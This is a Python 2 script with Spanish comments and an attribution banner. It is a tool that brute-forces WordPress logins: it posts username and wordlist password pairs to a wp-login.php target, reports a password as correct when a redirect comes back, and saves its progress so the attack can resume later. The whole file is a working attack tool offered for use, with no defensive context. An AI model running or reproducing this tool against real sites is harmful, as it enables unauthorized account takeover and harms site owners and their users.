#!/usr/bin/python
#coding:utf-8
# Importamos los modulos necesarios.
import sys
import argparse
import requests
from urlparse import urlparse


def reportarError(error):
    print """[*] ERROR!


Si es favorito, reporta el error:

{barras}
{error}
{barras}

https://lpericena.blogspot.com/

¡Gracias por su colaboración!
""".format(error=error.message, bars="-"*len(error.message))


def attack(target, user, passlist, restore = False):

    target = urlparse(target)

    if target.scheme == "":
        target = "http://{}".format(target.geturl())
    else:
        target = target.geturl()

    print "Target: {}\n".format(target)

    passlist = open(passlist, 'r')
    passlist = passlist.readlines()

    iteration = open('iteration.txt','a+')
    iteration.seek(0,0)
    content_iteration = iteration.readlines()

    if len(content_iteration) == 0:
        iteration.write("1\n")
        iteration.close()
        
    iteration = open('iteration.txt','r+')
    content_iteration = iteration.readlines()
    iteration.close()

    aux = passlist
    cont = 1
    Found = False

    if restore:
        print "[*] Restarar Ataque\n"
        last_value_iteration = int(str(content_iteration[len(content_iteration)-1]).strip())
        aux = aux[last_value_iteration-1:]
        if len(aux) == 0:
            cont = 1
            aux = passlist
        else:
            cont = last_value_iteration

    # Abrimos el diccionario.
    for password in aux:
        with open('iteration.txt','w') as iteration:
            try:
                cabeceras = {
                    "Content-type": "application/x-www-form-urlencoded",
                    "Accept": "text/plain"
                }
# Leemos cada palabra del diccionario una a una.
 #creamos una variable con los datos del POST
                payload = {
                    'log': user.strip(),
                    'pwd': password.strip()
                }
# Realizamos una peticion POST con los datos de wordpress.
                response = requests.post(target, data=payload, headers=cabeceras, allow_redirects=False)
# Comprobamos si el resultado de la conexion nos devuelve un codigo 301 o 302.
# Si el resultado es uno de estos dos codigos, la pass sera la correcta.
                if response.status_code in [302, 303]:
                    print '%d-%s  <----- Correcto :)' % (cont,password.strip())
                    cont = 0
                    Found = True
                    break
                elif response.status_code == 200:
                    print '%d-%s <----- Error :(' % (cont,password.strip())
                else:
                    print 'Error!!!!'

            except KeyboardInterrupt:
                print '\n Ejecución terminada por teclado '
                cont -= 1
                exit()
            except Exception as e:
                reportarError(e)
                exit()
            finally:
                cont += 1
                iteration.write(str(cont)+'\n')

    if not Found:
        print "\ No se pudo encontrar la password. :( \n"


def conexion():
    parser = argparse.ArgumentParser(
            usage="./Wp.py -t [target] -u [user] -w [passlist]",
            add_help=False,        
    )
    parser.add_argument("-h", "--help", action="help", help=" ¿Cómo usar la herramienta ")
    parser.add_argument("-t", dest='target', help="Ejemplo : localhost/wordpress/wp-login.php")
    parser.add_argument("-u", dest='user', help="username 0f Target")
    parser.add_argument("-w", dest='passlist', help="Dirección de lista de paso para la fuerza bruta")
    parser.add_argument("-r", dest='restore', action="store_true", help="Restaurar la ultima sesión del ataque.")
    args = parser.parse_args()
    
    authors = ['@Luishino']
    collaborators = ['@Cyber-Hacking']

	
    print """ 
                   :7uqE0ESJr.
                :7:.         :ir,         LvL:  .  7UL.
             vkr    i7uUSuJr:   ,uk:      ,@O  .8  :B.    
           Jq,  rO@@B@@@@@B@B@BN:  28i     qG  ;@  .L   LY.   . ,    . ..
         ,Mi  GB@BMOOOMOO8O8OOBB@Bi  E0    i@  0B. 7, :@v7BY  Z@u@F  YBEu@j
        r@  B@B@@MO@B@B@B@@@@OG@u     7@    @  L@v u  @.   B: :B  @,  @   @L
       ;@  v5r: ,MM. .i;ri: .OO@       ,@   Br .r@ j kB    EB :@  B:  B,  v@ 
       @       X1MOjj      XuO8@S     . :M  18i  Bi: BE    7@ ,B:2M   @,  :B
      M, O     B@GOM@B     M@88G@F    uu Or .@E  @B  MM    uB ,@0@    B,  i@
     .B ,@u    ,BMZ88@5     BBEGO@J   X@ .B  Bu  O@  ;@    BU :B Bi   @.  MB
     L5 F@@     NBOEGM@:    uBOEG@@   @B. @  @:  2k   BO  u@  J@  Br .BY 2B 
     5r G@B8     @MG0OBN     @BGEBB  JB@: M  r   ,:    5MG0  .5S7 70i7S51L 
     UL 0BM@i    Y@G8M@      ;@88BM  B@B: @ Autor: Luishino Pericena Choque  
     iE 7@O@B     B@O@r B.    B@O@. P@B@  B ,BMi@B                           
      @  BB8@1    ;B@@ :@G    :B@8  @M@X vk  @r  @L   .    . ,:.   L:    L:  
      vN iBMM@.    @@: @B@:    OB. @B@B  @   BY  BZ @BUBv  B@ruB  OirB  MirB 
       O; JB@BB    i@ YBOB@    ,@ iB@B  M;   @7  @i Y@ .B  uB  . :B  J .B  Y  
        B; rB@Bv      BMEOBu      @@B  OL    B@1@N  uB  @  Y@ :   @X    @q   
          01  0@B     G@GZZBB.    B@v  Mr    @F,    J@,MX  L@SB   :@B:  ,@@: 
           r8,  MB   r@MMOMM@@   ,S  YZ      Br     uBMP   Y@ r     EB.   qB 
             JXi     @B@B@B@B@:   .LXi       @r     UE @   YB    :.  MJ .  87
               i2uL:.         .r2Su.         BO     M@ :@. 0@  7:,@  E,.@  q.
                   ,7JYv7rrr77Lvi.          u0X;   :X0: UP:1XFuM. jqN7 .LqEv 
                             @Cyber-Hacking
 
    """.format(
        authors=', '.join(authors),
        collaborators=', '.join(collaborators)
    )
    
    if args.target and args.user and args.passlist:
        attack(args.target, args.user, args.passlist, args.restore)
    else:
        parser.print_help()


if __name__ == '__main__':
    conexion()
#Lo primero será importar el módulo request, que como ya hemos mencionado antes, nos permite interactuar con aplicaciones web.
